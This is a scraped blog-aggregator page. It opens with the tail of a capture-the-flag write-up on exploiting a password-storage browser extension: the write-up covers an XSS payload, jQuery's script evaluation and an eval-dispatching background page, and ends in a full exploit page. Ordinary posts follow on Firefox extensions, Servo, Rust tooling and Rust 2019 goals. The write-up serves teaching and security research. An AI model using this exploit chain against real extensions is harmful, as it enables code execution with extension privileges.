<p>Since the website can fill out and submit a form programmatically, it can make this extension remember whichever login it wants. Making the extension store something like <code>login&lt;img src=x onerror=alert(1)&gt;</code> will result in JavaScript code executing whenever the user opens the website in future. Trouble is: the code executes in the context of the same website that injected this code in the first place, so nothing is gained by that.</p>

<h4>Getting into the content script</h4>

<p>What you‚Äôd really want is having your script run within the content script of the extension. There is an interesting fact: if you call <code>eval()</code> in a content script, code will be evaluated in the context of the content script rather than website context. This happens even if the extension‚Äôs content security policy forbids eval: content security policy only applies to extension pages, not to its content scripts. Why the browser vendors don‚Äôt tighten security here is beyond me.</p>

<p>And now comes something very non-obvious. The <span class="caps">HTML</span> code is being inserted using the following:</p>

<pre><code>$container = $(html);
$login.parent().prepend($container);</code></pre>

<p>One would think that jQuery uses <code>innerHTML</code> or its moral equivalent here but that‚Äôs not actually true. <code>innerHTML</code> won‚Äôt execute JavaScript code within <code>&lt;script&gt;</code> tags, so jQuery is being ‚Äúhelpful‚Äù and executing that code separately. Newer jQuery versions will add a <code>&lt;script&gt;</code> tag to the <span class="caps">DOM</span> temporarily but the versions before jQuery 2.1.2 will essentially call <code>eval()</code>. Bingo!</p>

<p>So your payload has to be something like <code>login&lt;script&gt;alert(1)&lt;/script&gt;</code>, this way your code will run in the context of the content script.</p>

<h4>Getting from the content script to the background page</h4>

<p>The content script can only communicate with the background page via messaging. And the background page only supports two commands: <code>getLogins</code> and <code>addLogin</code>. Neither will allow you to extract the flag or inject code.</p>

<p>But the way the background page translates message types into handlers is remarkable:</p>

<pre><code>window[message.type].apply(window, message.params)</code></pre>

<p>If you look closely, you are not restricted by the handler functions defined in the background page, any global JavaScript function will do! And there is one particularly useful function called <code>eval()</code>. So your message has to look like this to extract the flag: <code>{type: 'eval', params: ['console.log(FLAG)']}</code>. There you go, you have code running in the background page that can extract the flag or do just about anything.</p>

<h4>The complete solution</h4>

<p>So here is my complete solution. As usually, this is only one way of doing it.</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;title&gt;Safe Login Storage solution&lt;/title&gt;
    &lt;script&gt;
      window.addEventListener("load", event =&gt;
      {
        window.setTimeout(() =&gt;
        {
          let container = document.getElementById("logins-container");
          if (!container || !container.querySelector("[data-value^='boom']"))
          {
            document.getElementById("username").value = "boom&lt;script&gt;chrome.runtime.sendMessage({type: 'eval', params: ['console.log(FLAG)']})&lt;\/script&gt;";
            document.getElementById("submit").click();
            window.location.reload();
          }
        }, 2000);
      });
    &lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;form action="javascript:void(0)" hidden&gt;
      &lt;input id="username"&gt;
      &lt;input id="submit" type="submit"&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;</code></pre></div></div><div class="permalink"><a href="https://palant.de/2018/12/17/bbn-challenge-resolution-getting-the-flag-from-a-browser-extension">by Wladimir Palant at <time datetime="2018-12-17T11:37:49Z" title="December 17, 2018 11:37 AM GMT">‰∏ãÂçà7:37:49</time></a></div></div><div class="news don-marti"><a id="news-17"></a><h3><a href="https://blog.zgp.org/" title="Don Marti">Don Marti</a> ‚Äî <a href="https://blog.zgp.org/firefox-extensions-list-2018/">Firefox extensions list 2018</a></h3><div class="entry"><div class="content"><p>One of the great things about Firefox is
the ability to customize with extensions.<span class="aside">A MIG-15 can climb and turn faster
than an F-86.  A MIG-15 is more heavily armed.
But in actual dogfights the <a href="https://blog.codinghorror.com/boyds-law-of-iteration/">F-86 won 9 out of 10
times</a>.
Part of that is training, but part is that
the Soviets used data to build for the average
pilot, while the USA <a href="https://www.thestar.com/news/insight/2016/01/16/when-us-air-force-discovered-the-flaw-of-averages.html">did a bigger study of pilots'
measurements</a>
and recognized that adjustable seats and controls
were necessary.  Even in a group of pilots of average
overall size, nobody was in the average range on
all their measurements.</span>  Here is what I'm
running right now.</p>
<ul>
<li><p><a href="https://addons.mozilla.org/en-US/firefox/addon/awesome-rss/">Awesome RSS</a>.  Get the RSS button back. Works great with RSS Preview.</p>
</li>
<li><p><a href="https://addons.mozilla.org/en-US/firefox/addon/blind-reviews/">blind-reviews</a>.  This is an experiment to help break your own habits of
bias when reviewing code contributions.  It hides the contributor name and email when you first see the code, and you can reveal it later.</p>
</li>
<li><p><a href="https://addons.mozilla.org/en-GB/firefox/addon/cookie-autodelete/">Cookie AutoDelete</a>.
Similar to the old "Self-Destructing Cookies". Cleans
up cookies after leaving a site.
Useful but requires me to whitelist the sites where
I want to stay logged in.  More time-consuming
than other privacy tools.  This is a good
safety measure that helps protect me while I'm
trying out new the <a href="https://digitalcontentnext.org/blog/2018/10/26/mozillas-path-to-enhanced-tracking-protection/">new privacy settings in Firefox
Nightly</a>
as my main data protection tool.</p>
</li>
<li><p><a href="https://addons.mozilla.org/en-US/firefox/addon/copy-as-markdown/">Copy as Markdown</a>.  Not quite as full-featured as the old "Copy as HTML Link" but
still a time-saver for blogging.  Copy both the page title and URL, formatted as Markdown, for pasting into a blog.</p>
</li>
<li><p><a href="https://addons.mozilla.org/en-US/firefox/addon/facebook-container/">Facebook Container</a> because, well, Facebook.</p>
</li>
<li><p><a href="https://addons.mozilla.org/en-US/firefox/addon/facebook-ad-collector/">Facebook Political Ad Collector</a>, even though I don't visit Facebook
very often.  This one reports sneaky Facebook ads <a href="https://www.propublica.org/article/help-us-monitor-political-ads-online">to
ProPublica</a>.</p>
</li>
<li><p><a href="https://addons.mozilla.org/en-US/firefox/addon/global-consent-manager/">Global Consent Manager</a>, which provides an improved
consent experience for European sites.  More info coming soon.</p>
</li>
<li><p><a href="https://www.eff.org/https-everywhere">HTTPS Everywhere</a>. This is pretty basic.  Use the encrypted version of a site where available.</p>
</li>
<li><p><a href="https://addons.mozilla.org/en-US/firefox/addon/link-cleaner/">Link Cleaner</a>. Get rid of crappy tracking parameters in URLs, and speed up
some navigation by skipping data collection redirects.</p>
</li>
<li><p><a href="https://addons.mozilla.org/en-US/firefox/addon/njs/">NJS</a>.
Minimal JavaScript disable/enable button that
remembers the setting by site and defaults to
"on".  Most sites that use JavaScript for
real applications are fine, but this is for
handling sites that cut and pasted a "Promote
your newsletter to people who haven't even read
your blog yet" script from some "growth hacking"
article.</p>
</li>
<li><p><a href="https://addons.mozilla.org/en-US/firefox/addon/personal-blocklist/">Personal Blocklist</a>
is surprisingly handy for removing domains that are
heavy on SEO but weak on actual information from
search results.  (the Ministry of Central Planning
at Google is building the perfectly-measured MIG
cockpit, while extension developers make stuff
adjustable.)</p>
</li>
<li><p><a href="https://addons.mozilla.org/en-US/firefox/addon/rsspreview/">RSS Preview</a>.
The other missing piece of the RSS experience.
The upside to the unpopularity of RSS
is that so many sites just leave the full-text
RSS feeds, that came with their CMS, turned on.</p>
</li>
</ul>
<h3>Bonus links</h3>
<p><a href="https://waypoint.vice.com/en_us/article/j5za97/artifact-isnt-a-game-on-steam-its-steam-in-a-game">'Artifact' Isn't a Game on Steam, It's Steam in a Game - Waypoint</a></p>
<p><a href="https://www.theatlantic.com/ideas/archive/2018/12/does-it-matter-where-you-go-college/577816/">Does It Matter Where You Go to College?</a></p>
<p><a href="https://www.theatlantic.com/politics/archive/2018/12/rich-people-are-getting-away-not-paying-their-taxes/577798/">The Golden Age of Rich People Not Paying Their Taxes</a></p>
<p><a href="https://hackaday.com/2018/12/07/liberating-birds-for-a-cheap-electric-scooter/">Liberating Birds For A Cheap Electric Scooter</a></p>
<p><a href="https://www.citylab.com/transportation/2018/12/americas-power-grid-isnt-ready-electric-cars/577507/">America‚Äôs Power Grid Isn‚Äôt Ready for Electric Cars</a></p></div></div><div class="permalink"><a href="https://blog.zgp.org/firefox-extensions-list-2018/">by Don Marti at <time datetime="2018-12-17T08:00:00Z" title="December 17, 2018 08:00 AM GMT">‰∏ãÂçà4:00:00</time></a></div></div><div class="news the-servo-blog"><a id="news-18"></a><h3><a href="https://blog.servo.org/" title="Servo Blog">The Servo Blog</a> ‚Äî <a href="https://blog.servo.org/2018/12/17/twis-121/">This Week In Servo 121</a></h3><div class="entry"><div class="content"><p>In the <a href="https://github.com/pulls?utf8=%E2%9C%93&amp;q=is%3Apr+is%3Amerged+closed%3A2018-12-03..2018-12-17+user%3Aservo+">past two weeks</a>,
we merged 113 PRs in the Servo organization‚Äôs repositories.</p>

<p>There are some interesting ideas <a href="https://www.reddit.com/r/rust/comments/a69zh3/usefulness_of_asyncawait_for_gc_in_rust/">being considered</a> about how to improve GC safety in Servo.</p>

<h3 id="planning-and-status">Planning and Status</h3>

<p>Our <a href="https://github.com/servo/servo/wiki/Roadmap">roadmap</a> is available online, including the overall plans for 2018.</p>

<p>This week‚Äôs status updates are <a href="https://build.servo.org/standups/">here</a>.</p>

<h3 id="exciting-works-in-progress">Exciting works in progress</h3>

<ul>
  <li>mandreyel is <a href="https://github.com/servo/servo/pull/22478">adding support</a> for parallel CSS parsing.</li>
  <li>SimonSapin is <a href="https://github.com/servo/servo/pull/22459">slowly but surely</a> <a href="https://github.com/servo/servo/pull/22464">converting</a>  buildbot CI jobs to run on Taskcluster.</li>
  <li>paulrouget is <a href="https://github.com/servo/servo/pull/22428">converting</a> the <code class="highlighter-rouge">simpleservo</code> crate into an API to embed Servo on new platforms without worrying about the details.</li>
  <li>jdm is <a href="https://github.com/servo/servo/pull/22395">fixing the longstanding bug</a> preventing iframes from knowing their own sizes on creation.</li>
  <li>oOIgnitionOo is <a href="https://github.com/servo/servo/pull/22387">making it easier</a> to find regression ranges in Servo nightlies.</li>
  <li>cbrewster is <a href="https://github.com/servo/servo/pull/22130">adding</a> profiling support for WebGL APIs.</li>
  <li>jdm is <a href="https://github.com/servo/servo/pull/21841">synchronizing</a> WebGL rendering with WebRender‚Äôs GL requirements.</li>
  <li>paulrouget is <a href="https://github.com/servo/servo/pull/21808">separating</a> the compositor from the rest of the browser to support more complex windowing requirements.</li>
</ul>

<h3 id="notable-additions">Notable Additions</h3>

<ul>
  <li>dlrobertson <a href="https://github.com/servo/ipc-channel/pull/153">documented</a> the ipc-channel crate.</li>
  <li>lucasfantacuci <a href="https://github.com/servo/servo/pull/22324">added</a> support for changing the volume of media elements.</li>
  <li>ferjm <a href="https://github.com/servo/servo/pull/22433">removed</a> a race in the media playback initialization.</li>
  <li>SimonSapin <a href="https://github.com/servo/servo/pull/22381">converted</a> the buildbot job that publishes Servo‚Äôs <a href="https://doc.servo.org/">documentation</a> to run on Taskcluster.</li>
  <li>cdeler <a href="https://github.com/servo/servo/pull/22386">added</a> support for bootstrapping a Servo build on Linux Mint.</li>
  <li>jdm <a href="https://github.com/servo/servo/pull/22389">made</a> CSS animations expire if the animating node no longer participates in layout.</li>
  <li>SimonSapin <a href="https://github.com/servo/servo/pull/22424">wrote</a> a lot of documentation for the new Taskcluster/Treeherder integration.</li>
  <li>nox <a href="https://github.com/servo/servo/pull/22432">implemented</a> support for non-UTF8 <code class="highlighter-rouge">Content-Type</code> charset values for documents.</li>
</ul>

<h3 id="new-contributors">New Contributors</h3>

<ul>
  <li><a href="https://github.com/dholbert">Daniel Holbert</a></li>
  <li><a href="https://github.com/demangejeremy">J√©r√©my DEMANGE</a></li>
  <li><a href="https://github.com/lucasfantacuci">Lucas Fantacuci</a></li>
  <li><a href="https://github.com/technicalguy">Shaun Steenkamp</a></li>
  <li><a href="https://github.com/sinkuu">Shotaro Yamada</a></li>
  <li><a href="https://github.com/cdeler">cdeler</a></li>
</ul>

<p>Interested in helping build a web browser? Take a look at our <a href="https://starters.servo.org/">curated list</a> of issues that are good for new contributors!</p></div></div><div class="permalink"><a href="https://blog.servo.org/2018/12/17/twis-121/">by The Servo Blog at <time datetime="2018-12-17T00:30:00Z" title="December 17, 2018 12:30 AM GMT">‰∏äÂçà8:30:00</time></a></div></div><div class="news the-rust-programming-language-blog" xml:lang="en"><a id="news-19"></a><h3><a href="https://blog.rust-lang.org/" title="Rust Blog">The Rust Programming Language Blog</a> ‚Äî <a href="https://blog.rust-lang.org/2018/12/17/Rust-2018-dev-tools.html">Tools in the 2018 edition</a></h3><div class="entry"><div class="content"><p>Tooling is an important part of what makes a programming language practical and
productive. Rust has always had some great tools (Cargo in particular has a
well-deserved reputation as a best-in-class package manager and build tool), and
the 2018 edition includes more tools which we hope further improve Rust users'
experience.</p>
<p>In this blog post I'll cover Clippy and Rustfmt ‚Äì two tools that have been
around for a few years and are now stable and ready for general use. I'll also
cover IDE support ‚Äì a key workflow for many users which is now much better
supported. I'll start by talking about Rustfix, a new tool which was central to
our edition migration plans.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/17/Rust-2018-dev-tools.html#rustfix" id="rustfix"></a>Rustfix</h3>
<p>Rustfix is a tool for automatically making changes to Rust code. It is a key
part of our migration story for the 2018 edition, making the transition from
2015 to 2018 editions much easier, and in many cases completely automatic. This
is essential, since without such a tool we'd be much more limited in the kinds
of breaking changes users would accept.</p>
<p>A simple example:</p>
<pre><code class="language-rust">trait Foo {
    fn foo(&amp;self, i32);
}
</code></pre>
<p>The above is legal in Rust 2015, but not in Rust 2018 (method arguments must be
made explicit). Rustfix changes the above code to:</p>
<pre><code class="language-rust">trait Foo {
    fn foo(&amp;self, _: i32);
}
</code></pre>
<p>For detailed information on how to use Rustfix, see <a href="https://doc.rust-lang.org/stable/edition-guide/editions/transitioning-an-existing-project-to-a-new-edition.html">these instructions</a>.
To transition your code from the 2015 to 2018 edition, run <code>cargo fix --edition</code>.</p>
<p>Rustfix can do a lot, but it is not perfect. When it can't fix your code, it
will emit a warning informing you that you need to fix it manually. We're
continuing to work to improve things.</p>
<p>Rustfix works by automatically applying suggestions from the compiler. When we
add or improve the compiler's suggestion for fixing an error or warning, then
that improves Rustfix. We use the same information in an IDE to give quick fixes
(such as automatically adding imports).</p>
<p>Thank you to Pascal Hertleif (killercup), Oliver Scherer (oli-obk), Alex
Crichton, Zack Davis, and Eric Huss for developing Rustfix and the compiler
lints which it uses.</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/17/Rust-2018-dev-tools.html#clippy" id="clippy"></a>Clippy</h3>
<p>Clippy is a linter for Rust. It has numerous (currently 290!) lints to help
improve the correctness, performance and style of your programs. Each lint can
be turned on or off (<code>allow</code>), and configured as either an error (<code>deny</code>) or
warning (<code>warn</code>).</p>
<p>An example: the <a href="https://rust-lang.github.io/rust-clippy/master/index.html#iter_next_loop"><code>iter_next_loop</code></a>
lint checks that you haven't made an error by iterating on the result of <code>next</code>
rather than the object you're calling <code>next</code> on (this is an easy mistake to make
when changing a <code>while let</code> loop to a <code>for</code> loop).</p>
<pre><code class="language-rust">for x in y.next() {
    // ...
}
</code></pre>
<p>will give the error</p>
<pre><code>error: you are iterating over `Iterator::next()` which is an Option; this will compile but is probably not what you want
 --&gt; src/main.rs:4:14
  |
4 |     for x in y.next() {
  |              ^^^^^^^^
  |
  = note: #[deny(clippy::iter_next_loop)] on by default
  = help: for further information visit https://rust-lang.github.io/rust-clippy/master/index.html#iter_next_loop
</code></pre>
<p>Clippy works by extending the Rust compiler. The compiler has support for a few
built-in lints, Clippy uses the same mechanisms but with lots more lints. That
means Clippy's error/warning format should be familiar, you should be able to
apply Clippy's suggestions in your IDE (or using Rustfix), and that the lints
are reliable and accurate.</p>
<p>With Rust 1.31 and the 2018 edition, Clippy is available on stable Rust and has
backwards compatibility guarantees (if it had a version number, it would be
1.0). Clippy has the same stability guarantees as rustc: new lints may be added,
and lints may be modified to add more functionality, however lints may never be
removed (only deprecated). This means that code that compiles with Clippy will
continue to compile with Clippy (provided there are no lints set to error via
<code>deny</code>), but may throw new warnings.</p>
<p>Clippy can be installed using <code>rustup component add clippy</code>, then use it with
<code>cargo clippy</code>. For more information, including how to run it in your CI, see
<a href="https://github.com/rust-lang/rust-clippy/">the repo readme</a>.</p>
<p>Thank you Clippy team (Pascal Hertleif (killercup), Oliver Scherer (oli-obk),
Manish Goregaokar (manishearth), and Andre Bogus (llogiq))!</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/17/Rust-2018-dev-tools.html#rustfmt" id="rustfmt"></a>Rustfmt</h3>
<p>Rustfmt is a tool for formatting your source code. It takes arbitrary, messy
code and turns it into neat, beautifully styled code.</p>
<p>Automatically formatting saves you time and mental energy. You don't need to
worry about style as you code. If you use Rustfmt in your CI (<code>cargo fmt --check</code>), then you don't need to worry about code style in review. By using a
standard style you make your project feel more familiar for new contributors and
spare yourself arguments about code style. Rust's <a href="https://github.com/rust-lang/rfcs/blob/master/style-guide/README.md">standard code
style</a> is
the Rustfmt default, but if you must, then you can customize Rustfmt
extensively.</p>
<p>Rustfmt 1.0 is part of the 2018 edition release. It should work on all code and
will be backwards compatible until the 2.0 release. By backwards compatible we
mean that if your code is formatted (i.e., excluding bugs which prevent any
formatting or code which does not compile), it will always be formatted in the
same way. This guarantee only applies if you use the default formatting options.</p>
<p>Rustfmt is not done. Formatting is not perfect, in particular we don't touch
comments and string literals and we are pretty limited with macro definitions
and some macro uses. We're likely to improve formatting here, but you will need
to opt-in to these changes until there is a 2.0 release. We <em>are</em> planning on
having a 2.0 release. Unlike Rust itself, we think its a good idea to have a
breaking release of Rustfmt and expect that to happen some time in late 2019.</p>
<p>To install Rustfmt, use <code>rustup component add rustfmt</code>. To format your project,
use <code>cargo fmt</code>. You can also format individual files using <code>rustfmt</code> (though
note that by default rustfmt will format nested modules). You can also use
Rustfmt in your editor or IDE using the RLS (see below; no need to install
rustfmt for this, it comes as part of the RLS). We recommend configuring your
editor to run rustfmt on save. Not having to think about formatting at all as
you type is a pleasant change.</p>
<p>Thank you Seiichi Uchida (topecongiro), Marcus Klaas, and all the Rustfmt
contributors!</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/17/Rust-2018-dev-tools.html#ide-support" id="ide-support"></a>IDE support</h3>
<p>For many users, their IDE is the most important tool. Rust IDE support has been
in the works for a while and is a highly demanded feature. Rust is now supported
in many IDEs and editors:
<a href="https://plugins.jetbrains.com/plugin/8182-rust">IntelliJ</a>, <a href="https://marketplace.visualstudio.com/items?itemName=rust-lang.rust">Visual Studio
Code</a>,
<a href="https://github.com/rust-lang-nursery/atom-ide-rust">Atom</a>, <a href="https://github.com/rust-lang/rust-enhanced">Sublime
Text</a>,
<a href="https://www.eclipse.org/downloads/packages/release/photon/r/eclipse-ide-rust-developers-includes-incubating-components">Eclipse</a>
(and more...). Follow each link for installation instructions.</p>
<p>Editor support is powered in two different ways: IntelliJ uses its own compiler,
the other editors use the Rust compiler via the Rust Language Server (RLS). Both
approaches give a good but imperfect IDE experience. You should probably choose
based on which editor you prefer (although if your project does not use Cargo,
then you won't be able to use the RLS).</p>
<p>All these editors come with support for standard IDE functions including 'go to
definition', 'find all references', code completion, renaming, and reformatting.</p>
<p>The RLS has been developed by the Rust dev tools team, it is a bid to bring Rust
support to as many IDEs and editors as possible. It directly uses Cargo and the
Rust compiler to provide accurate information about a program. Due to
performance constraints, code completion is not yet powered by the compiler and
therefore can be a bit more hit and miss than other features.</p>
<p>Thanks to the IDEs and editors team for work on the RLS and the various IDEs and
extensions (alexheretic, autozimu, jasonwilliams, LucasBullen, matklad,
vlad20012, Xanewok), Jonathan Turner for helping start off the RLS, and
phildawes, kngwyu, jwilm, and the other Racer contributors for their work on
Racer (the code completion component of the RLS)!</p>
<h3><a class="anchor" href="https://blog.rust-lang.org/2018/12/17/Rust-2018-dev-tools.html#the-future" id="the-future"></a>The future</h3>
<p>We're not done yet! There's lots more we think we can do in the tools domain
over the next year or so.</p>
<p>We've been improving rust debugging support in LLDB and GDB and there is more in
the works. We're experimenting with distributing our own versions with Rustup
and making debugging from your IDE easier and more powerful.</p>
<p>We hope to make the RLS faster, more stable, and more accurate; including using
the compiler for code completion.</p>
<p>We want to make Cargo a lot more powerful: Cargo will handle compiled binaries
as well as source code, which will make building and installing crates faster.
We will support better integration with other build systems (which in turn will
enable using the RLS with more projects). We'll add commands for adding and
upgrading dependencies, and to help with security audits.</p>
<p>Rustdoc will see improvements to its source view (powered by the RLS) and links
between documentation for different crates.</p>
<p>There's always lots of interesting things to work on. If you'd like to help chat
to us on GitHub or <a href="https://discordapp.com/invite/rust-lang">Discord</a>.</p></div></div><div class="permalink"><a href="https://blog.rust-lang.org/2018/12/17/Rust-2018-dev-tools.html">by The Dev-tools team at <time datetime="2018-12-17T00:00:00Z" title="December 17, 2018 12:00 AM GMT">‰∏äÂçà8:00:00</time></a></div></div><h2><time datetime="2018-12-15">Sunday, 16 December 2018</time></h2><div class="news henri-sivonen"><a id="news-20"></a><h3><a href="https://hsivonen.fi/" title="Henri Sivonen‚Äôs pages (Mozilla-only edition)">Henri Sivonen</a> ‚Äî <a href="https://hsivonen.fi/rust2019/">Rust 2019</a></h3><div class="entry"><div class="content"><p>The Rust team <a href="https://blog.rust-lang.org/2018/12/06/call-for-rust-2019-roadmap-blogposts.html">encouraged</a> people to write blog posts reflecting on Rust in 2018 and proposing goals and directions for 2019. Here‚Äôs mine.
</p><p>This is knowingly blatantly focused on the niche that is immediately relevant to my work. I don‚Äôt even pretend this to represent any kind of overall big picture.</p>

<h3>Rust in 2018</h3>

<p>In my <a href="http://hsivonen.iki.fi/rust2018/">Rust 2018 post</a>, I had these items:

</p><ul>
	<li><code>simd</code>-Style SIMD
	</li><li>Rust <code>bool</code> in FFI is C <code>_Bool</code>
	</li><li>Debug Info for Code Expanded from Macros
	</li><li>Non-Nightly Benchmarking
	</li><li>GUI for <code>rr replay</code>
	</li><li>Tool for Understanding What LLVM Did with a Given Function
</li></ul>

<p>As far as I know, the kind of tool I wanted for understading what LLVM did does not exist in a way that does not involve extracting a minimized case with the dependencies for copying and pasting to <a href="https://rust.godbolt.org/">rust.godbolt.org</a>. After one goes through the effort of making a Compiler Explorer-compatible extract, the tool is great, though. I don‚Äôt know if the feature existed a year ago, but Compiler Explorer now has tooltips that explain what assembly instructions do, so I‚Äôd rate this old wish half fulfilled. (Got the asm explanations but didn‚Äôt get to avoid manually extracting the code under scrutiny.)

</p><p>I‚Äôve been told that GUIs for rr exist and work. However, I got stuck with cgdb (launch with <code>rr replay --debugger=/usr/bin/cgdb --no-redirect-output</code>; thanks to Thomas McGuire and David Faure of KDAB for that incantation), because it has worked well for me, and the Python+browser front end that was recommended to me did not work right away. (I should try again.)

</p><p>Also, Rust <code>bool</code> is now <a href="https://doc.rust-lang.org/core/mem/fn.size_of.html">documented to have <code>size_of</code> 1</a> and the <a href="https://github.com/rust-lang/rust/pull/46176">proposal to make the compiler complain about <code>bool</code> in FFI</a> has been abandoned. üéâ

</p><h3>Cool Things in 2018 That I Did Not Ask For</h3>

<p>Looking back at 2018 beyond what I wrote in my Rust 2018 post, I am particularly happy about these features making it to non-nightly Rust:

</p><ul>
	<li>Non-lexical lifetimes
	</li><li><a href="https://doc.rust-lang.org/std/primitive.slice.html#method.align_to"><code>align_to</code></a>
	</li><li><a href="https://doc.rust-lang.org/std/primitive.slice.html#method.chunks_exact"><code>chunks_exact</code></a>
</li></ul>

<p>Non-lexical lifetimes is a huge boost for the ergonomics of the language. I hope the people who previously turned away from Rust due to the borrow checker will be willing to try again.

</p><p><code>align_to</code> makes it easier to write more obviously correct optimizations that look at byte buffers one register at a time. A bit disappointly, the previous sentence cannot say ‚Äúsafe code‚Äù, because <code>align_to</code> is still <code>unsafe</code>. It would be nice if there was a safe version with a trait bound on the types requiring types whose all bit patterns are defined and then having primitive integers and SIMD vectors with primitive integer lane types implement the relevant marker trait. (I.e. exposing endianness would be considered safe like integer overflow is considered safe.)

</p><p>I expect <code>chunks_exact</code> to be relevant to writing safe SIMD code.

</p><h3>Carry-Overs from 2018</h3>

<p>Some items from a year ago are not done.

</p><h4>Non-Nightly Benchmarking</h4>

<p>The library support for the <code>cargo bench</code> feature has been in the state ‚Äú<a href="https://users.rust-lang.org/t/timeline-for-libtest-stability/3123/3">basically, the design is problematic, but we haven‚Äôt had anyone work through those issues yet</a>‚Äù since 2015. It‚Äôs a useful feature nonetheless. Like I said a year ago, it‚Äôs time to let go of the possibility of tweaking it for elegance and just let users use it on non-nighly Rust.

</p><h4>Debug Info for Code Expanded from Macros</h4>

<p>No news on this <a href="https://github.com/rust-lang/rfcs/pull/2117">RFC</a>.

</p><h4>Portable SIMD</h4>

<p>A lot of work has been done on this topic in the past year, which is great. Thank you! Instead of the design of the <code>simd</code> crate, the <a href="https://github.com/rust-lang/rfcs/pull/2366">design</a> and <a href="https://github.com/rust-lang-nursery/packed_simd">implementation</a> is proceeding in the <code>packed_simd</code> crate. I wish that <code>packed_simd</code> <i>with its <code>into_bits</code> feature enabled</i> becomes <code>code::simd</code> / <code>std::simd</code> and available on non-nightly Rust in 2019.</p>

<p>A year ago I wished that <code>core::arch</code> / <code>std::arch</code> did not become available on non-nightly Rust before <code>core::simd</code> / <code>std::simd</code> out of concern that vendor-specific SIMD shipping before portable SIMD would unnecessarily skew the ecosystem towards the incumbent (Intel). I think it is too early to assess if the concern was valid.

</p><h3>New Items</h3>

<p>In addition to reiterating the old items, I do have some new ones, too.

</p><h4>Compiling the Standard Library with User Settings</h4>

<p>At present, when you compile a Rust artifact, your own code and the crates your code depends on get compiled, but the standard library is taken as a pre-compiled library. This is problematic especially with SIMD functionality moving to the standard library.

</p><p>32-bit CPU architectures like x86, ARM, PowerPC and MIPS introduced SIMD during the evolution of the instruction set architecture. Therefore, unlike in the case of x86_64, aarch64 and little-endian POWER, generic 32-bit targets cannot assume that SIMD support is present. If you as an application developer decide to scope your application to support only recent enough 32-bit CPUs that you can assume SSE2/NEON/AltiVec/MSA to be present and want to use <code>packed_simd</code> / <code>std::simd</code> to use the SIMD capability of the CPU, you are going to have a bad time if the Rust standard library has been compiled with the assumption that the SIMD unit does not exist.

</p><p>For 32-bit x86 and SSE2 Rust solves this by providing two targets: i586 without SSE2 and i686 with SSE2. Currently, the ARMv7 (both Thumb2 and non-Thumb2) targets are without NEON. I am <a href="https://github.com/rust-lang/rust/pull/49902">hoping</a> to introduce Thumb2+NEON variants in 2019.

</p><p>Adding targets won‚Äôt scale, though. For example, even in the x86_64 case you might determine that it is OK for you application to require a CPU that supports <a href="https://en.wikipedia.org/wiki/SSSE3">SSSE3</a>, which is relevant to portable SIMD by providing arbitrary shuffling as a single instruction. (At present, the SSE2 shuffle generation back end for LLVM misses even some seemingly obvious cases like transposing each of the eight pairs of lanes in <code>u8x16</code> by lane-wise shifting by 8 to both directions in an <code>u16x8</code> interpretation and bitwise ORing the results.)

</p><p>I hope that in 2019, Cargo gains the Xargo functionality of being able to compile the standard library with the same target feature settings that are used for compiling the user code and the crate dependencies.

</p><h4>Better Integer Range Analysis for Bound Check Elision</h4>

<p>Currently, LLVM only elides the bound checks when indexing into slices if you‚Äôve made the most obvious comparison previously between the index and the slice length. For example:</p>

<pre>if i &lt; slice.len() {
    slice[i] // bound check elided
}
</pre>

<p>Pretty much anything more complex <a href="https://github.com/rust-lang/rust/issues/55147">results in a bound check branch</a>, and the performance effect is measurable when it happens in the innermost loop. I hope that rustc and LLVM will do better in 2019. Specifically:

</p><ul>
	<li><p>LLVM should become able to eliminate the second check in code like:</p>
		<pre>if a + C &lt; b {
    if a + D &lt; b {
    	// ...
    }
}</pre>
<p>‚Ä¶if <code>a</code>, <code>b</code>, <code>C</code>, and <code>D</code> are all of type <code>usize</code>, <code>a</code> and <code>b</code> are run-time variables, <code>C</code> and <code>D</code> are compile-time constants such that <code>D &lt;= C</code> and <code>a + C</code> can be proven at compile time not to overflow.
	</p></li><li><p>LLVM should become able to figure out that <code>a + C</code> didn‚Äôt overflow if it was written as <code>a.checked_add(C).unwrap()</code> and execution continued to the second check.
	</p></li><li><p>rustc should become able to tell LLVM that a small constant added to <code>slice.len()</code> or a value previously checked to be less than <code>slice.len()</code> does not overflow by telling LLVM to assume that the maximum possible value for a slice length is quite a bit less than <code>usize::max_value()</code>.
	</p><p>Since a slice has to represent a possible allocation, the maximum possible value for <code>len()</code> is not <code>usize::max_value()</code>. On 64-bit platforms, rustc should tell LLVM that the <code>usize</code> returned by <code>len()</code> is capped by the number of bits the architecture actually uses for the virtual address space, which is lower than 64 bits. I‚Äôm not sure if Rust considers it permissible for 32-bit PAE processes allocate more than half the address space in a single allocation (it seems like a bad thing to allow in terms of pointer difference computations, but it looks like <a href="https://stackoverflow.com/questions/3463207/how-big-can-a-malloc-be-in-c/3486163">glibc has at least it the past allowed such allocations</a>), but even if it considered permissible, it should be possible to come up with a slice size limit by observing that a slice cannot fill the whole address space, because at least the stack size and the size of the code for a minimal program have to be reserved.
	</p></li><li><p>LLVM should become able to figure out that if <code>a: ufoo</code> and <code>a &gt;= C</code>, then <code>a - C &lt; ufoo::max_size() + 1 - C</code> and, therefore, indexing with <code>a - C</code> into an array whose length is <code>ufoo::max_size() + 1 - C</code> does not need a bound check. (Where <code>C</code> is a compile-time constant.)
</p></li></ul>

<h4><code>likely()</code> and <code>unlikely()</code> for Plain <code>if</code> Branch Prediction Hints</h4>

<p>The <a href="https://github.com/rust-lang/rust/issues/26179">issue for <code>likely()</code> and <code>unlikely()</code></a> has stalled on the observation that they don‚Äôt generalize for <code>if let</code>, <code>match</code>, etc. They would work for plain <code>if</code>, though. Let‚Äôs have them for plain <code>if</code> in 2019 even if <code>if let</code>, <code>match</code>, etc., remain unaddressed for now.

</p><h4>No LTS</h4>

